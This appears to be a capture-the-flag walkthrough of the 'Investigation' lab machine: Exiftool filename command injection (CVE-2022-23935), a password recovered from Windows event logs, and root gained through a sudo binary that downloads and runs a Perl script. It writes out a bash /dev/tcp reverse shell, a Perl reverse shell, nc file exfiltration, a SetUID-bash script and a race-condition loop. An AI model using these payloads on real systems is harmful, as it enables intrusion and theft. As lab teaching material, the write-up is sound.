![Investigation](/img/investigation-cover.png)

Investigation starts with a website that accepts user uploaded images and runs Exiftool on them. This version has a command injection. I‚Äôll dig into that vulnerability, and then exploit it to get a foothold. Then I find a set of Windows event logs, and analyze them to extract a password. Finally, I find a piece of malware that runs as root and understand it to get execution.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

There‚Äôs a redirect on port 80 to `eforenzics.htb`. I‚Äôll use `wfuzz` to look for any subdomains that respond differently, but not find anything. I‚Äôll add this to my `hosts` file:

```
10.10.11.197 eforenzics.htb

```

### Website - TCP 80

#### Site

The site is for a forensics company:

[![image-20230418073051838](/img/image-20230418073051838.png)](/img/image-20230418073051838.png)

[*Click for full image*](/img/image-20230418073051838.png)

All the links in the page are to other places on the page except for ones that go to `/service.html`. This page offers ‚ÄúImage Forensics‚Äù, specifically on JPG files:

![image-20230418083703426](/img/image-20230418083703426.png)

On giving it a JPG, it offers a link to a ‚Äúreport‚Äù:

![image-20230418083736570](/img/image-20230418083736570.png)

That report is `[original filename with special characters removed].txt`. So `htb.jpg` becomes `htbjpg.txt`:

```

Megapixels                      : 0.040

```

This is the output of [Exiftool](https://exiftool.org/).

#### Tech Stack

The pages on the site are `index.html` and `services.html`. However, when I upload an image it goes to `upload.php`, so it‚Äôs a PHP site with mostly static pages.

As noted above, Exiftool is being used to get metadata on the images, and the output shows it‚Äôs version 12.37.

#### Directory Brute Force

I‚Äôll run `feroxbuster` against the site, and include `-x php,html`:

```

oxdf@hacky$ feroxbuster -u http://eforenzics.htb -x php,html

There‚Äôs a bunch there, but nothing interesting.

## Shell as www-data

### CVE-2022-23935

#### Identify

Googling for ‚Äúexiftool 12.37‚Äù, the top result is about a command injection vulnerability in Exiftool before 12.38:

![image-20230418091540922](/img/image-20230418091540922.png)

The issue, as described in [this gist](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429), is in how Perl handles filenames ending in `|` with the `open` command. In [Pikaboo](/2021/12/04/htb-pikaboo.html#exploit-cvsupdate) I walked through abusing this on a script that was using Perl‚Äôs `<>` operator, which is a shorthand that includes a call to `open`. Exiftool is written in Perl, and before version 12.38, was missing that the filename (user controlled) could be used to get command execution.

There‚Äôs a different CVE in Exiftool that I exploited in [Meta](/2022/06/11/htb-meta.html#exiftool-exploit), CVE-2021-22204. That one involved poisoning the metadata, not the filename.

#### Vulnerability Details

Nothing in this section is required to continue with exploitation of Investigation. The gist gives a POC that I can move forward with, but it‚Äôs still interesting and worthwhile to understand how vulnerabilities work. I‚Äôll explore that in [this video](https://www.youtube.com/watch?v=UiRx1Zkeqzg):

The summary points are:
- If a filename passed to `open` ends in `|`, the string before the `|` is executed and then the result (sent to STDOUT) is what is read from the resulting file handle.
- Exiftool actually makes use of that when it detects a file with a `.gz` or `.bz2` extension, changing the filename to something that will decompress it, and then handle the output. For example, `.gz` files become `gzip -dc "$file" |`.
- Later, when Exiftool opens the file, it explicitly checks for the `|` to see if it should open in the mode that allows for execution.
- If I run Exiftool on a file with its name ending in `|`, that filename will be interpreted as a command and executed.

### RCE

#### POC

To test this out, I‚Äôll find the HTTP request where I submit an image in Burp Proxy history, and send it to Repeater:

![image-20230418125028031](/img/image-20230418125028031.png)

The filename is set in the form data metadata. I‚Äôll change it to `ping -c 10.10.14.6|` and start `tcpdump` to listen for ICMP. On sending the request, an ICMP packet comes back:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:51:18.487116 IP 10.10.11.197 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
12:51:18.487125 IP 10.10.14.6 > 10.10.11.197: ICMP echo reply, id 2, seq 1, length 64

```

That‚Äôs code execution on Investigation.

#### Shell

To get a shell, I‚Äôll try a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). It doesn‚Äôt work in raw form, likely because of the special characters required. I‚Äôll base64-encode the shell, messing with extra whitespace until there‚Äôs no special characters (not always required, but can be helpful):

```

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIAo=
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK

```

Now I‚Äôll send that as the `filename`:

![image-20230418125705292](/img/image-20230418125705292.png)

It hangs, but there‚Äôs a shell at a listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 37680
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1681837009$

```

I‚Äôll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@investigation:~/uploads/1681837009$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@investigation:~/uploads/1681837009$ ^Z

nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@investigation:~/uploads/1681837009$

```

## Shell as smorton

### Enumeration

#### smorton

There‚Äôs a single home directory on the box, and www-data can‚Äôt access it:

```

www-data@investigation:/$ ls /home/
smorton
www-data@investigation:/$ cd /home/smorton/
bash: cd: /home/smorton/: Permission denied

```

There‚Äôs not too much else interesting on the file system. I‚Äôll look for files owned by smorton:

```

www-data@investigation:/$ find / -user smorton 2>/dev/null
/home/smorton
/usr/local/investigation/Windows Event Logs for Analysis.msg

```

The `investigation` directory is worth further investigation.

#### investigation Directory

There are two files in the directory:

```

www-data@investigation:/usr/local/investigation$ ls -l
total 1280
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r-- 1 www-data www-data       0 Oct  1  2022  analysed_log

```

`analysed_log` is always 0 bytes. There‚Äôs actually a `cron` running as www-data that should be writing to it every five minutes before it clears the images and analysis:

```

www-data@investigation:/usr/local/investigation$ crontab -l
...[snip]...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*

```

The problem is, somehow `analysed_log` got set as immutable:

```

www-data@investigation:/usr/local/investigation$ lsattr analysed_log 
-u--i---------e----- analysed_log

```

So when the `cron` tries to write to it, it fails:

```

www-data@investigation:/usr/local/investigation$ date >> /usr/local/investigation/analysed_log
bash: /usr/local/investigation/analysed_log: Operation not permitted

```

Because the commands are joined with `&&`, once the first one fails, it stops, and the cleanup is broken as well.

I‚Äôll exfil the `.msg` file with `nc`, starting a listener on my machine, and then sending the file back:

```

www-data@investigation:/usr/local/investigation$ cat Windows\ Event\ Logs\ for\ Analysis.msg | nc 10.10.14.6 443

```

It arrives at my machine:

```

oxdf@hacky$ nc -lnvp 443 > 'Windows Event Logs for Analysis.msg'
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 42746

```

I‚Äôll double check that the MD5 hashes of each match.

### Event Log Analysis

#### Extract Message Attachment

`.msg` files are Outlook messages. Without a copy of Outlook handy, I‚Äôll use `msgconvert` (installed with `sudo apt install libemail-outlook-message-perl`) to convert it to `mbox` format:

```

oxdf@hacky$ msgconvert Windows\ Event\ Logs\ for\ Analysis.msg --mbox emails.mbox

```

This writes the message into a mailbox in the `emails.mbox` file. I‚Äôll open it with `mutt -f emails.mbox`. When it asks about creating a `Mail` file, I‚Äôll select `no`, and it opens the mailbox with a single email:

![image-20230418132654341](/img/image-20230418132654341.png)

I‚Äôll hit enter to go into the email:

![image-20230418132729865](/img/image-20230418132729865.png)

There‚Äôs a message from Tom and an attachment. I‚Äôll hit `v` to view the attachments:

![image-20230418132808989](/img/image-20230418132808989.png)

I‚Äôll arrow key down to `evtx-logs.zip` and push `s` to save. After exiting `mutt`, I‚Äôll unzip the attachment:

```

oxdf@hacky$ unzip -l evtx-logs.zip 
Archive:  evtx-logs.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 15798272  2022-08-01 13:36   security.evtx
---------                     -------
 15798272                     1 file
oxdf@hacky$ unzip evtx-logs.zip 
Archive:  evtx-logs.zip
  inflating: security.evtx  

```

The file is a Windows Vista Event log:

```

oxdf@hacky$ file security.evtx 
security.evtx: MS Windows Vista Event Log, 238 chunks (no. 237 in use), next record no. 20013

```

#### Converting to JSON

To get this into a format I can analyze, I‚Äôll convert the events to JSON. I played with a few different tools from GitHub to do this, but liked `evtx_dump` from [this repo by omerbenamram](https://github.com/omerbenamram/evtx). I‚Äôll download the latest release and drop it in a folder in my boxes path.

The trick is to use the output format `jsonl` and not `json`. `json` will include lines with record numbers that breaks tools like `jq` when it tries to parse it. `jsonl` puts it all on one line of JSON, which `jq` can then parse:

```

oxdf@hacky$ evtx_dump security.evtx -o jsonl -t 1 -f security.json
oxdf@hacky$ cat security.json | jq . | head
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": null,
      "EventID": 1102,

```

#### Log Summary

I‚Äôll start by getting a feel for the different types of logs present and their frequency:

```

oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -nr | uniq -c | sort -nr            
   5217 4673
   4266 4703
   2972 4658
   2319 4656
    752 4946
    685 4688
    657 4689
    612 4690
...[snip]...

```

The most common log type is 4673 ([A privileged service was called](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4673)) with over five thousand logs. Then there‚Äôs 4703 ([A token right was adjusted](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4703)) at over four thousand. I‚Äôll take a look at these, but it doesn‚Äôt lead anywhere.

I‚Äôll also take a look at the different log types. To show each one, I‚Äôll use the reference I cited above in a Bash loop with a bit of `grep` to get the title:

```

oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -u | while read id; do curl -s https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=${id} | grep -A1 'class="hey"' | grep -v 'class="hey"'; done
        1102: The audit log was cleared
        4611: A trusted logon process has been registered with the Local Security Authority
        4624: An account was successfully logged on
        4625: An account failed to log on
        4627: Group membership information.
        4634: An account was logged off
...[snip]...

```

Some interesting ones jump out:
- `1102: The audit log was cleared` - might want to look at activity from that account around that time.
- `4624: An account was successfully logged on` - get a feel for the accounts logging in
- `4625: An account failed to log on` - look for any brute forces or other strange behavior
- `4688: A new process has been created` - look for any interesting processes on the box
- `4698: A scheduled task was created` and `4702: A scheduled task was updated` - look for any persistence
- `4732: A member was added to a security-enabled local group` - This can be very suspicious if it wasn‚Äôt done by an admin

There are probably others that might be interesting as well. I‚Äôll start to work my way through these.

#### Logons

I‚Äôll find something interesting looking at the successful and failed logins. The note from Tom mentions checking to see if analysts are logging into the investigation station.

I‚Äôll filter out based on event ID and get a lot of data about each event:

```

{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {

      "LmPackageName": "-",

      "WorkstationName": "-"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": {
        "#attributes": {
          "ActivityID": "6A946884-A5BC-0001-D968-946ABCA5D801"
        }
      },
      "EventID": 4624,
      "EventRecordID": 11363364,
      "Execution": {
        "#attributes": {
          "ProcessID": 628,
          "ThreadID": 1664
        }
      },
      "Keywords": "0x8020000000000000",
      "Level": 0,
      "Opcode": 0,
      "Provider": {
        "#attributes": {
          "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
          "Name": "Microsoft-Windows-Security-Auditing"
        }
      },
      "Security": null,
      "Task": 12544,
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2022-08-01T16:00:39.944631Z"
        }
      },
      "Version": 2
    }
  }
}

```

I‚Äôll print the username and domain for each for each with a count for how many times:

```

oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4624) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
     49 NT AUTHORITY\SYSTEM
      8 EFORENZICS-DI\SMorton
      4 Window Manager\DWM-3
      4 EFORENZICS-DI\LJenkins
      2 Window Manager\DWM-9
      2 Window Manager\DWM-8
      2 Window Manager\DWM-7
      2 Window Manager\DWM-6
      2 Window Manager\DWM-5
      2 Window Manager\DWM-4
      2 Font Driver Host\UMFD-3
      2 EFORENZICS-DI\LMonroe
      2 EFORENZICS-DI\HMarley
      2 EFORENZICS-DI\AAnderson
      1 Font Driver Host\UMFD-9
      1 Font Driver Host\UMFD-8
      1 Font Driver Host\UMFD-7
      1 Font Driver Host\UMFD-6
      1 Font Driver Host\UMFD-5
      1 Font Driver Host\UMFD-4

```

If I take the same look at the unsuccessful logins by changing the filter from 4624 to 4625, I‚Äôll find three:

```

oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4625) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
      1 EFORENZICS-DI\lmonroe
      1 EFORENZICS-DI\hmraley
      1 \Def@ultf0r3nz!csPa$$

```

The first two match with users above, but the last one looks like a password, as if someone typed their password into the username field. This could happen when a user walks up to their computer and starts typing their password thinking they are going to unlock the computer, but they aren‚Äôt logged in for some reason.

### SSH

That password works for smorton over SSH:

```

oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$$' ssh smorton@eforenzics.htb
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)
...[snip]...
smorton@investigation:~$

```

The user flag is now available:

```

smorton@investigation:~$ cat user.txt
fe330173************************

```

## Shell as root

### Enumeration

smorton can run `/usr/bin/binary` as root:

```

smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary

```

In fact, only root can run this:

```

smorton@investigation:~$ binary
-bash: /usr/bin/binary: Permission denied
smorton@investigation:~$ ls -l /usr/bin/binary 
-r-xr-xr-- 1 root root 19024 Jan  5 16:02 /usr/bin/binary

```

Running it just prints ‚ÄúExiting‚Ä¶‚Äù:

```

smorton@investigation:~$ sudo binary
Exiting... 

```

### binary

#### Exfil

I‚Äôll download a copy of the binary over `scp`:

```

oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$$' scp smorton@eforenzics.htb:/usr/bin/binary .

```

#### Reversing

I‚Äôll open it in Ghidra and take a look. All the action is in `main`. `main` has two arguments, `argc` which is the number of command line args, and `argv`, which is a pointer to the array of arguments. I‚Äôll rename and retype those, as well as the other variables in the decompile.

The code starts by checking that there are two args (three counting the program name) and that the current user is root, exiting if either check fails:

```

  if (argc != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  userid = getuid();
  if (userid != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }

```

Then it verifies that the second arg is the string ‚ÄúlDnxUysaQn‚Äù:

```

  res = strcmp(argv[2],"lDnxUysaQn");
  if (res != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }

```

It opens that as a file for writing:

```

  puts("Running... ");
  filehandle = fopen(argv[2],"wb");

```

Next is uses `curl` to make a web request:

```

  curl_object = curl_easy_init();
  curl_easy_setopt(curl_object,0x2712,argv[1]);
  curl_easy_setopt(curl_object,0x2711,filehandle);
  curl_easy_setopt(curl_object,0x2d,1);
  res = curl_easy_perform(curl_object);

```

First it sets the URL (0x2712) to the first argument from the command line. Then it sets the output file (0x2711) to the filehandle from the `lDnxUysaQn` file. 0x2d sets verbose to true, and then it executes the curl command.

If the `curl` is successful, it does the following:

```

  if (res == 0) {
    res = snprintf((char *)0x0,0,"%s",argv[2]);
    arg2_str = (char *)malloc((long)res + 1);
    snprintf(arg2_str,(long)res + 1,"%s",argv[2]);
    res = snprintf((char *)0x0,0,"perl ./%s",arg2_str);
    cmd_str = (char *)malloc((long)res + 1);
    snprintf(cmd_str,(long)res + 1,"perl ./%s",arg2_str);
    fclose(filehandle);
    curl_easy_cleanup(curl_object);
    setuid(0);
    system(cmd_str);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

This code is taking a weird route to building a command string that looks like `perl ./[arg2]`. It‚Äôs running whatever was downloaded with `perl`. Then it cleans up, including removing that file, and returns.

This file doesn‚Äôt make a lot of sense unless I view it as a piece of malware that‚Äôs under analysis by this forensics firm.

### Execution

#### Obvious [Option 1]

To get a shell, I‚Äôll write a simple Perl reverse shell (based on [revshells.com](https://www.revshells.com/)):

```

use Socket;
$i="10.10.14.6";
$p=443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("sh -i");
}

```

Now I simply host that on a Python webserver run `binary` with the URL pointing to it:

```

smorton@investigation:~$ sudo binary 10.10.14.6/shell.pl lDnxUysaQn
Running...

```

It fetches from my server:

```
10.10.11.197 - - [18/Apr/2023 16:07:48] "GET /shell.pl HTTP/1.1" 200 -

```

And there‚Äôs a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 40802
# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can read `root.txt`:

```

# cd /root
# cat root.txt
e9f2ff77************************

```

#### Bash [Option 2]

Ippsec pointed out to me that `perl script.sh` will respect the shebang line of the script. So if `script.sh` starts with `#!/bin/bash`, `perl` will pass that off to `bash` for execution. That means that I can create `shell.sh` that will create a SetUID copy of `bash`:

```

#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf

```

Running this the same way works:

```

smorton@investigation:~$ sudo binary 10.10.14.6/shell.sh lDnxUysaQn
Running... 
smorton@investigation:~$ /tmp/0xdf -p
0xdf-5.0# 

```

#### Race Condition [Option 3]

It‚Äôs also possible to exploit a race condition to abuse this binary. It gets the binary and writes the file, then does some calculations of string length and builds a string, and then calls `system` to run that string. Between the `curl` and the `system` calls, because it‚Äôs saving in the current directory, if that directory is one that my current user owns, I can move files even if I don‚Äôt own them and can‚Äôt write to them.

To illustrate this, I‚Äôll listen with `nc` on 80 rather than a Python webserver. When I run the binary, it connects, leaving it in a hung state waiting for the server to respond. At this point, the output file exists and is empty:

```

smorton@investigation:~$ ls -l lDnxUysaQn 
-rw-r--r-- 1 root root 0 Apr 18 20:44 lDnxUysaQn

```

I can‚Äôt write to it, but I can move it:

```

smorton@investigation:~$ echo "test" > lDnxUysaQn 
-bash: lDnxUysaQn: Permission denied
smorton@investigation:~$ mv lDnxUysaQn 0xdf
smorton@investigation:~$ ls
0xdf  user.txt

```

To abuse this, I‚Äôll create a script I want to get to run:

```

#!/bin/bash

id
echo "pwned"

```

Now I‚Äôll get two shells on Investigation. In the first, I‚Äôll run an infinite loop:

```

smorton@investigation:~$ while :; do if [ -f lDnxUysaQn ]; then mv -f lDnxUysaQn garbage ; cp -f 0xdf.sh lDnxUysaQn; sleep 1; rm lDnxUysaQn; fi; done

```

This checks for the existence of `lDnxUysaQn`, and if it‚Äôs there, moves it to `garbage` and copies `0xdf.sh` over it. Then it sleeps for a second and removes the file.

Now when I run `binary`, it doesn‚Äôt matter what‚Äôs in the file, but it has to exist (so that `curl` returns success and the file is executed). When I run this:

```

smorton@investigation:~$ sudo binary 10.10.14.6/race lDnxUysaQn
Running... 
uid=0(root) gid=0(root) groups=0(root)
pwned

```

It may not trigger every time, but it was most for me. Because it‚Äôs waiting for the file to appear, the timing works out that it moves it just at the right time.
